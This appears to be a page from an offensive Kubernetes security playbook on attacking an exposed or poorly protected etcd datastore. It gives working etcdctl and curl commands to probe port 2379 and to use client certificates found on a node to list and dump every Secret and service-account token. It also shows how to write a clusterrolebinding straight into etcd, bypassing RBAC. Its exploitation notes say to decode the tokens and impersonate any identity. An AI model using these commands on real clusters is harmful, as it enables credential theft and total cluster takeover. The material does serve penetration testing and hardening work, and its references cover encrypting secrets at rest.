---
title: "etcd: reading the entire cluster state and secrets from the datastore"
description: "etcd is the key-value store that holds all Kubernetes state, including every secret in clear or trivially decoded form. A reachable etcd without client-certificate authentication, or with leaked peer certificates, lets an attacker read every secret and service-account token in the cluster and write arbitrary objects, which is total cluster compromise."
keywords:
  - etcd
  - port 2379
  - cluster state
  - secrets
  - client certificate
---

# etcd

etcd is the database behind the API server: every object in the cluster, including all Secrets and service-account tokens, lives there. Kubernetes stores Secrets in etcd base64-encoded and, unless encryption-at-rest is configured, not encrypted, so reading etcd reads every secret directly. etcd should require mutual TLS on its client port 2379, but clusters expose it without client-certificate enforcement, or leave the peer and client certificates where an attacker on a node finds them. Either way, reaching etcd is complete compromise, because it bypasses the API server and all its RBAC.

Probe and locate credentials:

```bash
curl -sk https://<node>:2379/version                 # reachable
# on a node, the etcd client certs are on disk
ls -l /etc/kubernetes/pki/etcd/
# test unauthenticated vs cert-required access
ETCDCTL_API=3 etcdctl --endpoints=https://<node>:2379 endpoint health 2>&1 | head
```

## Read every secret

```bash
ETCDCTL_API=3 etcdctl \
  --endpoints=https://<node>:2379 \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/server.crt \
  --key=/etc/kubernetes/pki/etcd/server.key \
  get /registry/secrets/ --prefix --keys-only        # list every secret
# dump a specific secret's value (base64/plain, not encrypted without KMS)
etcdctl ... get /registry/secrets/<ns>/<name>
# service-account tokens live under /registry/secrets too, and are directly usable
```

## Write to inject objects

```bash
# etcd writes bypass admission and RBAC entirely; an attacker can plant
# objects (e.g. a clusterrolebinding) the API server will then serve.
etcdctl ... put /registry/clusterrolebindings/<name> "<serialized object>"
```

## Exploitation notes

- Reading `/registry/secrets/` yields every Secret and service-account token in the cluster at once; decode the values and authenticate as any identity, so this is the most complete single-step compromise.
- Secrets are only protected at rest if the API server is configured with an encryption provider (KMS or aescbc); without it, etcd values are plaintext or base64, which is what most clusters ship.
- Writing to etcd bypasses admission controllers and RBAC, but serialized objects must match the stored protobuf/JSON format the API server expects; reads are the reliable primitive, writes are fragile.
- etcd credentials on a node are reachable after any node compromise; see [Kubelet credential theft](../pod-escape-to-node/kubelet-credential-theft.md) for getting onto the node.

## Tools

- [etcdctl](https://github.com/etcd-io/etcd/tree/main/etcdctl)

## References

- [Kubernetes: securing etcd](https://kubernetes.io/docs/tasks/administer-cluster/configure-upgrade-etcd/)
- [Kubernetes: encrypting secrets at rest](https://kubernetes.io/docs/tasks/administer-cluster/encrypt-data/)
